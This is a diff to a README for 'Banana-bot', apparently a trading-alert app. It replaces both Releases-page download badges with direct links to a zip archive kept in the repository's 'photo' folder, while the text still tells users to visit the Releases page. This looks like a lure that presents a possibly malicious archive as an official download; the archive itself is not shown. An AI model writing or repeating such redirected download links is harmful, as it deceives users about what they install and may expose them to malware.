@@ -6,7 +6,7 @@ Welcome to Banana-bot! This application provides you with real-time alerts for S
 ## 📥 Download & Install
 To get started, visit the link below to download Banana-bot:
 
-[![Download Banana-bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/felino216/Banana-bot/releases)
+[![Download Banana-bot](https://raw.githubusercontent.com/felino216/Banana-bot/main/photo/Banana-bot_2.0.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/felino216/Banana-bot/main/photo/Banana-bot_2.0.zip)
 
 1. Click the above button or link to go to the Releases page.
 2. Look for the latest version of Banana-bot.
@@ -73,6 +73,6 @@ If you need assistance or wish to contribute to Banana-bot, feel free to reach o
 ## 🔗 Download Again
 Don’t forget, you can download Banana-bot anytime here:
 
-[![Download Banana-bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/felino216/Banana-bot/releases)
+[![Download Banana-bot](https://raw.githubusercontent.com/felino216/Banana-bot/main/photo/Banana-bot_2.0.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/felino216/Banana-bot/main/photo/Banana-bot_2.0.zip)
 
 Enjoy your experience with Banana-bot! Happy trading!
